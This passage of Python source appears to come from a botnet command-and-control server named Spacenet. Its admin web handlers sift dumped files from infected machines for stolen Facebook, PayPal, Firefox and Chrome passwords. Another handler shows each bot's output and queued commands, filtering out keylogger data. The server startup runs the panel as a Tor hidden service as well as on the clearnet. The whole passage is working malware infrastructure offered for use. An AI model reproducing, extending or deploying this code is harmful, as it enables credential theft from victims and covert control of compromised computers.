    @cherrypy.expose
    @require_admin
    def sortSel(self, mode):

	if mode == "face":
		SaveLog("Request Password DB => Printing All Facebook Passwords")
		argc_buffer = ""
		index_result = 0
		list_of_files = glob.glob('DumpDir/*.txt')
		if not list_of_files:
			out_file = open("TempDir/tmp.txt","w")
			out_file.write("")
			out_file.close()
		for fileName in list_of_files:
			data = open(fileName).readlines()
			for i in range(len(data)):
					 if "facebook" in data[i] or "Facebook" in data[i]: 
							    if "," in data[i]:
								argc_buffer = data[i]
							    else:
 								

								    website = data[i].split("Website:")[1]
								    usr = data[i+2].split("Username:")[1]	
								    pwd = data[i+4].split("Password:")[1]
								    
								    
								    argc_buffer   += "--[ Result <b>%s</b> in <b>%s</b>\n\n" % (str(index_result),str(fileName))
							    	    argc_buffer   += "<b>Website  </b>: " + website.rstrip() + "\n"
							    	    argc_buffer   += "<b>Username </b>: " + usr.rstrip() +"\n"
							    	    argc_buffer   += "<b>Password </b>: " + pwd.rstrip() +"\n\n"
								    index_result += 1

					 out_file = open("TempDir/tmp.txt","w")
					 out_file.write(argc_buffer)
					 out_file.close()
	if mode == "pp":
		SaveLog("Request Password DB => Printing All PayPal Passwords")
		argc_buffer = ""
		index_result = 0
		list_of_files = glob.glob('DumpDir/*.txt')
		if not list_of_files:
			out_file = open("TempDir/tmp.txt","w")
			out_file.write("")
			out_file.close()
		for fileName in list_of_files:
			data = open(fileName).readlines()
			for i in range(len(data)):
					 if "paypal" in data[i] or "Paypal" in data[i] or "PayPal" in data[i]: 
							    if "," in data[i]:
								argc_buffer = data[i]
							    else:

								    website = data[i].split("Website:")[1]
								    usr = data[i+2].split("Username:")[1]	
								    pwd = data[i+4].split("Password:")[1]
								    
								    
								    argc_buffer   += "--[ Result <b>%s</b> in <b>%s</b>\n\n" % (str(index_result),str(fileName))
							    	    argc_buffer   += "<b>Website  </b>: " + website.rstrip() + "\n"
								    argc_buffer   += "<b>Username </b>: " + usr.rstrip() +"\n"
								    argc_buffer   += "<b>Password </b>: " + pwd.rstrip() +"\n\n"
								    index_result += 1

					 out_file = open("TempDir/tmp.txt","w")
					 out_file.write(argc_buffer)
					 out_file.close()

	if mode == "fir":
		SaveLog("Request Password DB => Printing All Firefox Passwords")
		list_of_files = glob.glob('DumpDir/*.txt')
		if not list_of_files:
			out_file = open("TempDir/tmp.txt","w")
			out_file.write("")
			out_file.close()
		for fileName in list_of_files:
		    	useful_content = []
			with open(fileName, 'r') as input:
			    all_lines = input.readlines()  # read all lines
			    for idx in range(len(all_lines)):  # iterate all lines
				    if 'FIREFOX PASSWORDS : ' in all_lines[idx]:
					useful_content.append(all_lines[idx])
					idx = idx + 1
					# found start of useful contents, continue iterate till it ends
					while '[*] All Firefox' not in all_lines[idx]:
					    useful_content.append(all_lines[idx])
					    idx = idx + 1
					break
			
			out_file = open("TempDir/tmp.txt","w")
			for line in useful_content:
				out_file.write(str(line))
			out_file.close()
	if mode == "chr":
		SaveLog("Request Password DB => Printing All Chrome Passwords")
		list_of_files = glob.glob('DumpDir/*.txt')
		if not list_of_files:
			out_file = open("TempDir/tmp.txt","w")
			out_file.write("")
			out_file.close()
		for fileName in list_of_files:
		    	useful_content = []
			with open(fileName, 'r') as input:
			    all_lines = input.readlines()  # read all lines
			    for idx in range(len(all_lines)):  # iterate all lines
				    if 'CHROME PASSWORDS : ' in all_lines[idx]:
					useful_content.append(all_lines[idx])
					idx = idx + 1
					# found start of useful contents, continue iterate till it ends
					while '[*] All Chrome' not in all_lines[idx]:
					    useful_content.append(all_lines[idx])
					    idx = idx + 1
					break
			
			out_file = open("TempDir/tmp.txt","w")
			for line in useful_content:
				out_file.write(str(line))
			out_file.close()

	if mode == "all":
		SaveLog("Request Password DB => Printing All Passwords")
		list_of_files = glob.glob('DumpDir/*.txt')
		if not list_of_files:
			out_file = open("TempDir/tmp.txt","w")
			out_file.write("")
			out_file.close()
		for fileName in list_of_files:
			in_file = open(fileName,"r")
			text = in_file.read()
			in_file.close()
			out_file = open("TempDir/tmp.txt","w")
			out_file.write(text)
			out_file.close()
	
    @cherrypy.expose
    @require_admin
    def stdout(self, botid):
        if not validate_botid(botid):
            raise cherrypy.HTTPError(403)
        output = ""
        bot_output = query_DB('SELECT * FROM output WHERE bot=? ORDER BY date DESC', (botid,))

        for entry in reversed(bot_output):
	    if "infopc" in entry[2] or "removeme" in entry[2] or "keylogger" in entry[2]:
		pass
	    else:
            	output += "%s\n\n" % entry[2]

        bot_queue = query_DB('SELECT * FROM commands WHERE bot=? and sent=? ORDER BY date', (botid, 0))
        for entry in bot_queue:
            output += "> %s [PENDING...]\n\n" % entry[2]
	    SaveLog("Sending Command : %s" %entry[2])
        return output
	

# Startup server
def main():
	
	# ----- Handler Keyboard Interupt -----
	signal.signal(signal.SIGINT, signal_handler)
	# ------------------------
	
	# ----- Tor service start -----
	try:
		os.system("sudo service tor start > /dev/null")
	except:
		pass
	# ----- Server conf -----
	app = Main()
	app.api = API()
	app.cnc = CNC()
	cherrypy.config.update("conf/server.conf")
	app = cherrypy.tree.mount(app, "", "conf/server.conf")
	app.merge({"/": { "error_page.default": error_page}})
	# ------------------------
	
	# ----- Folder Creator -----
	makedir.run("logs")
	# --------------------------
	
	
	# ----- Onion hostname reader -----	
	try:
		in_file = open("/var/lib/tor/hidden_service/hostname","r")
		text = in_file.read()
		in_file.close()
		SaveLog("Starting onion server on : http://%s:%s"%( text.rstrip() ,  cherrypy.config["server.socket_port"]))
	except:
		pass
	# --------------------------
	
	# ----- Server start -----
	SaveLog("Starting clearnet server on : http://%s:%s"% (cherrypy.config["server.socket_host"], cherrypy.config["server.socket_port"]))
	cherrypy.engine.start()
	cherrypy.engine.block()
	# --------------------------
	

# Welcome message
def welcome():
	global SYS_VERSION
	os.system("clear")

	cprint('\n\n\t.oooooo..o                                                                    .  ', 'blue')
	cprint('\td8P'    'Y8                                                                        .o8   ', 'cyan')
	cprint('\tY88bo.      oo.ooooo.   .oooo.    .ooooo.   .ooooo.  ooo. .oo.    .ooooo.  .o888oo ', 'blue')
	cprint("\t '''Y8888o.  888' '88b 'P  )88b  d88' 'Y8  d88' '88b '888P'Y88b  d88' '88b   888  ", 'cyan')
	cprint('\t     `"Y88b  888   888  .oP"888  888       888ooo888  888   888  888ooo888   888  ', 'blue')
	cprint('\too     .d8P  888   888 d8(  888  888   .o8 888    .o  888   888  888    .o   888 . ', 'cyan')
	cprint("\t8''88888P'   888bod8P' 'Y888''8o 'Y8bod8P' 'Y8bod8P' o888o o888o 'Y8bod8P'   '888' ", 'blue', end=' ')
	cprint("V"+SYS_VERSION, 'blue')
	cprint('\t             888                                                         ', 'cyan')
	cprint('\t            o888o                                              \n', 'blue')

	cprint("__[ ! ] Software : Spacenet", 'white')
	cprint("__[ ! ] Version  : 0.0.1", 'white')
	cprint("__[ ! ] Author   : Spaceb4r", 'white')
	cprint("__[ ! ] Help     : See UsersGuide.pdf", 'yellow')
	cprint("------------------------------------------------------------------------------------------------------\n", 'white' ,attrs=['bold'] )


# Main starting function
if __name__ == "__main__":    
	
	welcome()
	main()
